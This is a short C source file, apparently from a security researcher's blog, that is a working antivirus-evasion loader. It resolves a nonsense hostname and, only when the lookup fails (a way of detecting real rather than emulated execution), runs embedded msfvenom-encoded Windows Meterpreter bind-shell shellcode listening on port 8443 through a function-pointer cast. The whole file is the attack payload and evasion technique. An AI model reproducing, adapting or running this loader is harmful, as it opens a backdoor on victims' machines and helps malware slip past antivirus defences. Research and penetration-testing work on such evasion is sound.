//gethostbyname.c by Daniel Sauder (@DanielX4v3r)
//blog: govolution.wordpress.com
//wine gcc -m32 gethostbyname.c -lws2_32

#include <stdio.h>
#include <winsock2.h>

WSADATA wsaData;
WORD version;

int main(int argc, char **argv) {

	struct hostent *hp = gethostbyname("adsfadsfasdf.asdfasdfasdf");
	if (hp == NULL) {

		//msfvenom -p windows/meterpreter/bind_tcp lport=8443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
		unsigned char buf[] = 
		"\xda\xd7\xb8\xa7\xda\x4b\x6a\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
		"\x4b\x83\xef\xfc\x31\x47\x16\x03\x47\x16\xe2\x52\x26\xa3\xe8"
		"\x9c\xd7\x34\x8d\x15\x32\x05\x8d\x41\x36\x36\x3d\x02\x1a\xbb"
		"\xb6\x46\x8f\x48\xba\x4e\xa0\xf9\x71\xa8\x8f\xfa\x2a\x88\x8e"
		"\x78\x31\xdc\x70\x40\xfa\x11\x70\x85\xe7\xdb\x20\x5e\x63\x49"
		"\xd5\xeb\x39\x51\x5e\xa7\xac\xd1\x83\x70\xce\xf0\x15\x0a\x89"
		"\xd2\x94\xdf\xa1\x5b\x8f\x3c\x8f\x12\x24\xf6\x7b\xa5\xec\xc6"
		"\x84\x09\xd1\xe6\x76\x50\x15\xc0\x68\x27\x6f\x32\x14\x3f\xb4"
		"\x48\xc2\xca\x2f\xea\x81\x6c\x94\x0a\x45\xea\x5f\x00\x22\x79"
		"\x07\x05\xb5\xae\x33\x31\x3e\x51\x94\xb3\x04\x75\x30\x9f\xdf"
		"\x14\x61\x45\xb1\x29\x71\x26\x6e\x8f\xf9\xcb\x7b\xa2\xa3\x83"
		"\x48\x8e\x5b\x54\xc7\x99\x28\x66\x48\x31\xa7\xca\x01\x9f\x30"
		"\x2c\x38\x67\xae\xd3\xc3\x97\xe6\x17\x97\xc7\x90\xbe\x98\x8c"
		"\x60\x3e\x4d\x38\x6a\x99\x3e\x5e\x91\x73\xbe\xf4\x68\xec\x2a"
		"\x07\xb2\x0c\x55\xc2\xdb\xa5\xa8\xec\xc3\xce\x24\x0a\x69\x21"
		"\x61\x85\x06\x83\x56\x1e\xb0\xfc\xbc\xe5\xfe\x76\x67\xb2\x96"
		"\xcf\x7e\x04\x98\xcf\x54\x23\x0e\x44\xbb\xf0\x2f\x5b\x96\x51"
		"\x27\xcc\x6c\x33\x0a\x6c\x70\x1e\xfe\x6e\xe4\xa4\xa9\x39\x90"
		"\xa6\x8c\x0e\x3f\x59\xfb\x0c\x38\xa5\x7a\x3e\x32\x93\xe8\x00"
		"\x2c\xdb\xfc\x80\xac\x8d\x96\x80\xc4\x69\xc3\xd2\xf1\x76\xde"
		"\x46\xaa\xe2\xe1\x3e\x1e\xa5\x89\xbc\x79\x81\x15\x3e\xac\x92"
		"\x52\xc0\x31\x93\xa3\x02\xe4\x5d\xd6\x6d\x34";
			
		int (*funct)();
		funct = (int (*)()) buf;
		(int)(*funct)();

	}

	return 0;
}